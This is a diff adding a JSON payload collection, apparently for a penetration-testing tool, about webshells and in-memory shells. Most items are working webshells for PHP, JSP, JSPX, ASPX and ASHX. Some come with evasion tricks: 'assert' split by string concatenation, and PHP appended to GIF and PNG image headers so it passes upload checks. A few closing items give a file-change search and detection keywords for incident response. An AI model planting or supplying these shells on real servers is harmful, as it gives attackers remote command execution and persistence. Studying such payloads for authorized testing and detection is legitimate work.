@@ -1,0 +1,173 @@
+{
+  "kind": "payload",
+  "version": 1,
+  "group": "WebShell 与内存马",
+  "categories": ["PHP", "JSP", "ASPX", "内存马思路", "检测与加固"],
+  "items": [
+    {
+      "id": "webshell-php-post",
+      "title": "PHP POST 一句话",
+      "category": "PHP",
+      "code": "<?php @eval($_POST['cmd']); ?>",
+      "desc": "最基础的一句话木马，仅用于授权测试中验证上传与解析。",
+      "tags": ["webshell", "php"],
+      "vars": [],
+      "file": "shell.php",
+      "risk": "danger",
+      "source": "OWASP File Upload Cheat Sheet"
+    },
+    {
+      "id": "webshell-php-request",
+      "title": "PHP REQUEST 一句话",
+      "category": "PHP",
+      "code": "<?php @eval($_REQUEST['cmd']); ?>",
+      "desc": "GET/POST 均可传参，便于测试。",
+      "tags": ["webshell", "php"],
+      "vars": [],
+      "file": "shell-request.php",
+      "risk": "danger",
+      "source": "通用手法"
+    },
+    {
+      "id": "webshell-php-bypass-func",
+      "title": "禁用函数替代写法",
+      "category": "PHP",
+      "code": "<?php $f='as'.'sert';$f($_POST['cmd']); ?>",
+      "desc": "通过字符串拼接规避部分检测，需确认 assert 是否可用。",
+      "tags": ["webshell", "php", "bypass"],
+      "vars": [],
+      "file": "shell-bypass.php",
+      "risk": "danger",
+      "source": "公开免杀研究"
+    },
+    {
+      "id": "webshell-php-image",
+      "title": "图片头伪装木马",
+      "category": "PHP",
+      "code": "GIF89a<?php @eval($_POST['cmd']); ?>",
+      "desc": "配合解析漏洞或 .htaccess 使用，绕过内容检测。",
+      "tags": ["webshell", "php", "bypass"],
+      "vars": [],
+      "file": "shell.gif.php",
+      "risk": "danger",
+      "source": "PayloadsAllTheThings"
+    },
+    {
+      "id": "webshell-php-png",
+      "title": "PNG 图片马（真图成品）",
+      "category": "PHP",
+      "code": "<?php @eval($_POST['cmd']); ?>",
+      "desc": "真实 1×1 PNG 字节后追加 PHP 代码，getimagesize() 等图像校验可通过；下载即成品，适合后缀白名单或内容检测场景，需配合解析漏洞 / 文件包含执行。若目标放行双后缀可自行改名为 shell.png.php。",
+      "tags": ["webshell", "php", "bypass", "png"],
+      "vars": [],
+      "file": "shell.png",
+      "filePrefix": "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR4nGP4////fwAJ+wP9KobjigAAAABJRU5ErkJggg==",
+      "risk": "danger",
+      "source": "PayloadsAllTheThings"
+    },
+    {
+      "id": "webshell-jsp-cmd",
+      "title": "JSP 命令执行",
+      "category": "JSP",
+      "code": "<%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>",
+      "desc": "最小化 JSP 执行片段，无回显，适合快速验证。",
+      "tags": ["webshell", "jsp"],
+      "vars": [],
+      "file": "shell.jsp",
+      "risk": "danger",
+      "source": "OWASP File Upload Cheat Sheet"
+    },
+    {
+      "id": "webshell-jsp-echo",
+      "title": "JSP 带回显执行",
+      "category": "JSP",
+      "code": "<% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\"cmd\")).getInputStream(); int a; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b,0,a)); } %>",
+      "desc": "读取命令输出并回显，便于验证。",
+      "tags": ["webshell", "jsp", "echo"],
+      "vars": [],
+      "file": "shell-echo.jsp",
+      "risk": "danger",
+      "source": "通用手法"
+    },
+    {
+      "id": "webshell-jspx",
+      "title": "JSPX 版本",
+      "category": "JSP",
+      "code": "<jsp:root xmlns:jsp=\"http://java.sun.com/JSP/Page\" version=\"2.0\"><jsp:scriptlet>Runtime.getRuntime().exec(request.getParameter(\"cmd\"));</jsp:scriptlet></jsp:root>",
+      "desc": "XML 形式 JSP，部分黑名单只拦 .jsp 后缀。",
+      "tags": ["webshell", "jsp", "jspx"],
+      "vars": [],
+      "file": "shell.jspx",
+      "risk": "danger",
+      "source": "通用手法"
+    },
+    {
+      "id": "webshell-aspx",
+      "title": "ASPX 执行",
+      "category": "ASPX",
+      "code": "<%@ Page Language=\"C#\" %><% System.Diagnostics.Process.Start(\"cmd.exe\",\"/c \" + Request[\"cmd\"]); %>",
+      "desc": "ASPX 执行命令片段，需注意应用池权限。",
+      "tags": ["webshell", "aspx"],
+      "vars": [],
+      "file": "shell.aspx",
+      "risk": "danger",
+      "source": "OWASP File Upload Cheat Sheet"
+    },
+    {
+      "id": "webshell-ashx",
+      "title": "ASHX 处理程序",
+      "category": "ASPX",
+      "code": "<%@ WebHandler Language=\"C#\" Class=\"Handler\" %><%@ Import Namespace=\"System.Diagnostics\" %><script runat=\"server\">public class Handler : IHttpHandler { public void ProcessRequest(HttpContext ctx) { Process.Start(\"cmd.exe\", \"/c \" + ctx.Request[\"cmd\"]); } public bool IsReusable { get { return false; } } }</script>",
+      "desc": "ASHX 为轻量处理程序，需实现 IHttpHandler 才能被 .NET 执行，常被忽略在检测范围之外。",
+      "tags": ["webshell", "ashx", "bypass"],
+      "vars": [],
+      "file": "shell.ashx",
+      "risk": "danger",
+      "source": "通用手法"
+    },
+    {
+      "id": "webshell-memshell-tomcat",
+      "title": "Tomcat 内存马思路",
+      "category": "内存马思路",
+      "code": "通过 Filter / Servlet 动态注册，把恶意逻辑驻留内存，不落盘",
+      "desc": "内存马无文件落地，传统文件查杀难以发现，需结合行为与流量检测。",
+      "tags": ["webshell", "memshell", "tomcat", "java"],
+      "vars": [],
+      "risk": "danger",
+      "source": "公开 Java 内存马研究"
+    },
+    {
+      "id": "webshell-memshell-spring",
+      "title": "Spring 内存马思路",
+      "category": "内存马思路",
+      "code": "通过 HandlerMapping / Interceptor 注入控制器逻辑",
+      "desc": "利用 Spring 组件注册机制驻留内存，需要具备代码执行前置条件。",
+      "tags": ["webshell", "memshell", "spring"],
+      "vars": [],
+      "risk": "danger",
+      "source": "公开 Java 内存马研究"
+    },
+    {
+      "id": "webshell-detect-files",
+      "title": "排查最近变更文件",
+      "category": "检测与加固",
+      "code": "find /var/www -type f \\( -name '*.php' -o -name '*.jsp' \\) -mtime -7",
+      "desc": "按修改时间排查可疑脚本，辅助应急响应。",
+      "tags": ["webshell", "detect", "ir"],
+      "vars": [],
+      "risk": "low",
+      "source": "通用应急响应实践"
+    },
+    {
+      "id": "webshell-detect-keywords",
+      "title": "常见特征关键字",
+      "category": "检测与加固",
+      "code": "eval( / assert( / base64_decode( / Runtime.getRuntime() / ProcessBuilder / request.getParameter",
+      "desc": "结合白名单比对，降低误报。",
+      "tags": ["webshell", "detect", "checklist"],
+      "vars": [],
+      "risk": "low",
+      "source": "通用应急响应实践"
+    }
+  ]
+}
